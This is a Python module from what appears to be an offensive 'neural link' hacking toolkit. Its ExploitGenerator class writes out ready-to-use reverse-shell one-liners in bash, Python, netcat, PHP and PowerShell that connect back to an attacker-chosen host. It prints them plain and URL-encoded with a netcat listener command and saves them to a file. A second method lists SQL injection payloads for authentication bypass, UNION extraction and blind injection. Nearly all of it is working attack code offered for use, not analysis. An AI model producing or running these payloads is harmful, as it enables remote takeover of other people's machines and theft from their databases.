#!/usr/bin/env python3
"""
Exploit payload generation module
Compiles neural link payloads and injection vectors
"""

import urllib.parse
from utils.colors import Colors

class ExploitGenerator:
    def __init__(self, workspace):
        self.workspace = workspace

    def reverse_shell(self, lhost, lport=4444, shell_type='all'):
        """Generate reverse neural link payloads"""
        print(f"{Colors.NEON_PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}")
        print(f"{Colors.cyber_exploit('REVERSE NEURAL LINK COMPILER')}")
        print(f"{Colors.NEON_CYAN}[LHOST]{Colors.END} {Colors.NEON_GREEN}{lhost}{Colors.END}")
        print(f"{Colors.NEON_CYAN}[LPORT]{Colors.END} {Colors.NEON_GREEN}{lport}{Colors.END}")
        print(f"{Colors.NEON_PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}\n")

        shells = {
            'bash': f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",

            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",

            'nc': f"nc -e /bin/bash {lhost} {lport}",

            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",

            'powershell': f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        }

        if shell_type == 'all':
            for name, payload in shells.items():
                print(f"{Colors.NEON_CYAN}[{name.upper()} PAYLOAD]{Colors.END}")
                print(f"{Colors.NEON_GREEN}{payload}{Colors.END}\n")

                encoded = urllib.parse.quote(payload)
                print(f"{Colors.NEON_PURPLE}[URL ENCODED]{Colors.END}")
                print(f"{Colors.GRAY}{encoded}{Colors.END}\n")
                print(f"{Colors.NEON_PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}\n")
        else:
            payload = shells.get(shell_type, shells['bash'])
            print(f"{Colors.NEON_CYAN}[{shell_type.upper()} PAYLOAD]{Colors.END}")
            print(f"{Colors.NEON_GREEN}{payload}{Colors.END}\n")

            encoded = urllib.parse.quote(payload)
            print(f"{Colors.NEON_PURPLE}[URL ENCODED]{Colors.END}")
            print(f"{Colors.GRAY}{encoded}{Colors.END}\n")

        print(f"{Colors.NEON_YELLOW}[LISTENER COMMAND]{Colors.END}")
        print(f"{Colors.NEON_GREEN}nc -lvnp {lport}{Colors.END}\n")

        # Save to file
        shells_file = self.workspace.get_exploit_file('reverse_shells')
        with open(shells_file, 'w') as f:
            f.write(f"LHOST: {lhost}\nLPORT: {lport}\n\n")
            for name, payload in shells.items():
                f.write(f"[{name.upper()}]\n{payload}\n\n")

        print(f"{Colors.cyber_success('Payload compiled successfully')}")
        print(f"{Colors.NEON_CYAN}[SAVED]{Colors.END} {Colors.NEON_GREEN}{shells_file}{Colors.END}\n")

        return shells

    def sqli_payloads(self):
        """Generate SQL injection exploit vectors"""
        print(f"{Colors.NEON_PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}")
        print(f"{Colors.cyber_exploit('SQL INJECTION EXPLOIT DATABASE')}")
        print(f"{Colors.NEON_PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}\n")

        payloads = {
            'AUTH BYPASS': [
                "admin' OR '1'='1'--",
                "admin'--",
                "' OR '1'='1'--",
                "' OR 1=1--",
                "admin' OR '1'='1' #"
            ],
            'UNION INJECTION': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT database(),NULL,NULL--",
                "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
            ],
            'BOOLEAN BLIND': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND SUBSTRING(database(),1,1)='a'--"
            ],
            'TIME-BASED BLIND': [
                "' AND SLEEP(5)--",
                "' AND IF(1=1, SLEEP(5), 0)--"
            ]
        }

        for category, payload_list in payloads.items():
            print(f"{Colors.NEON_CYAN}[{category}]{Colors.END}")
            for payload in payload_list:
                print(f"  {Colors.NEON_GREEN}►{Colors.END} {payload}")
            print()

        # Save to file
        sqli_file = self.workspace.get_exploit_file('sqli_payloads')
        with open(sqli_file, 'w') as f:
            for category, payload_list in payloads.items():
                f.write(f"[{category}]\n")
                for payload in payload_list:
                    f.write(f"{payload}\n")
                f.write("\n")

        print(f"{Colors.cyber_success('Exploit database loaded')}")
        print(f"{Colors.NEON_CYAN}[SAVED]{Colors.END} {Colors.NEON_GREEN}{sqli_file}{Colors.END}\n")

        return payloads
